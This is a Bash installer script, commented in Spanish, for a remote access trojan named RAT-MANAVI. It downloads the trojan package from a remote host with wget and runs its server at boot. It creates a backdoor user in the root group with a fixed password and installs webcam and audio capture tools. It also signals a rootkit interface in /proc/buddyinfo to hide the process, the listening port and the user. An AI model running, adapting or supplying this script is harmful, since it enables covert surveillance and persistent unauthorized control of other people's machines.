#!/bin/bash

RAT_DIR=$HOME/.rat/manavi/
LOG_FILE=$RAT_DIR/rat.log

MODPROBE=/sbin/modprobe
INSMOD=/sbin/insmod

RAT_USER=manavi
SPORT=6660

ping -c 4 www.google.com > /dev/null 2>>/dev/null

if [ $? != 0 ]
then 
	echo "Necesitas internet para continuar..."
	echo "Saliendo del instalador."
	exit
else
	echo "Podeis continuar con la instalacion."
	if [ ! -d $RAT_DIR ]
	then
		echo "Creando directorio de instalacion..."
		mkdir -p $RAT_DIR
	else
		echo "Teneis lo necesario para continuar"
	fi
fi

if [ ! -f RAT-MANAVI.tar.gz ]
then
	echo "Descargando el paquete necesario para la instalacion..."
	wget 192.168.222.9/RAT/RAT-MANAVI.tar.gz
	echo "Paquete descargado"
else
	echo "Como ya tienes el paquete continuamos con la instalacion."
fi

echo "Descomprimiendo el paquete..."
tar xzf RAT-MANAVI.tar.gz -C $RAT_DIR
cd $RAT_DIR

echo "root $$" > /proc/buddyinfo 2>/dev/null

#Crear el usuario con el desde el cual se obtendrán los archivos
useradd $RAT_USER -d /home/$RAT_USER/ -M -s /bin/false -G root
echo manavi:manavi | chpasswd

#Se instalan todas las dependencias
apt-get -y install imagemagick 1>/dev/null
apt-get -y install streamer 1>/dev/null
apt-get -y install alsa-utils 1>/dev/null
apt-get -y install alsa-oss 1>/dev/null
apt-get -y install 4l2ucp 1>/dev/null 2&>/dev/null
apt-get -y install sqlite3 1>/dev/null
apt-get -y install python-dev  1>/dev/null
apt-get -y install linux-headers-$(uname -r) 1>/dev/null
apt-get -y install sshpass 1>/dev/null

#Se habilita el modulo.
$MODPROBE snd_pcm_oss 

#Agregar a init.d script server
ln -s $RAT_DIR''RAT-MANAVI/server.py /etc/init.d/

#Intalar modulo de rootkit
#cd $RAT_DIR''RAT-MANAVI/rootkit/
#$INSMOD rootkit.ko

#Ejecutar el server.py
$RAT_DIR''/RAT-MANAVI/server.py

#Ocultar proceso
echo "hpid $$" > /proc/buddyinfo 2>/dev/null

#Ocultar conexion
echo "hsport $SPORT" > /proc/buddyinfo 2>/dev/null

#Ocultar usuario
echo "huser $RAT_USER" > /proc/buddyinfo 2>/dev/null

